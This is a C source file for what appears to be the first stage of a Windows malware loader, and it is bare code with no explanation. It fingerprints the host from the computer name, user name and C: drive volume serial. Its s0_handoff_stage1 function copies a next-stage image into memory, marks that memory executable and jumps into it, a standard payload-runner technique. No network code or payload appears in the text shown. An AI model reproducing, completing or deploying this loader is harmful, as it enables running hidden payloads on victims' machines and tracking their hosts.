#include "stage0.h"
#include <intrin.h>

static void s0_copy(void *dst, const void *src, size_t n) {
    uint8_t *d = (uint8_t *)dst;
    const uint8_t *s = (const uint8_t *)src;
    while (n--) *d++ = *s++;
}

uint32_t s0_checksum(const void *data, uint32_t length) {
    const uint8_t *p = (const uint8_t *)data;
    uint32_t h = 2166136261u;
    while (length--) h = (h ^ *p++) * 16777619u;
    return h;
}

int s0_buffer_reserve(s0_buffer *b, uint32_t wanted) {
    uint8_t *p;
    uint32_t cap;
    if (!b || wanted > S0_MAX_FRAME) return 0;
    if (wanted <= b->capacity) return 1;
    cap = b->capacity ? b->capacity : 512u;
    while (cap < wanted && cap < S0_MAX_FRAME / 2u) cap <<= 1u;
    if (cap < wanted) cap = wanted;
    p = (uint8_t *)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                               b->data, cap);
    if (!p && !b->data)
        p = (uint8_t *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
    if (!p) return 0;
    b->data = p;
    b->capacity = cap;
    return 1;
}

void s0_buffer_free(s0_buffer *b) {
    if (!b) return;
    if (b->data) {
        SecureZeroMemory(b->data, b->capacity);
        HeapFree(GetProcessHeap(), 0, b->data);
    }
    b->data = 0;
    b->length = b->capacity = 0;
}

uint64_t s0_host_fingerprint(void) {
    wchar_t computer[256] = {0}, user[256] = {0};
    DWORD cn = 255, un = 255, serial = 0;
    uint64_t h = 1469598103934665603ull;
    uint8_t *p;
    size_t n, i;
    GetComputerNameW(computer, &cn);
    GetUserNameW(user, &un);
    GetVolumeInformationW(L"C:\\", 0, 0, &serial, 0, 0, 0, 0);
    p = (uint8_t *)computer; n = cn * sizeof(wchar_t);
    for (i = 0; i < n; ++i) h = (h ^ p[i]) * 1099511628211ull;
    p = (uint8_t *)user; n = un * sizeof(wchar_t);
    for (i = 0; i < n; ++i) h = (h ^ p[i]) * 1099511628211ull;
    for (i = 0; i < sizeof(serial); ++i)
        h = (h ^ ((uint8_t *)&serial)[i]) * 1099511628211ull;
    return h;
}

int s0_handoff_stage1(const uint8_t *image, uint32_t length,
                      const s0_config *config) {
    void *mem;
    DWORD old;
    if (!image || !length || !config) return 0;
    mem = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 0;
    s0_copy(mem, image, length);
    if (!VirtualProtect(mem, length, PAGE_EXECUTE_READ, &old)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return 0;
    }
    FlushInstructionCache(GetCurrentProcess(), mem, length);
    ((s0_stage1_entry_fn)mem)(config, image, length);
    return 1;
}

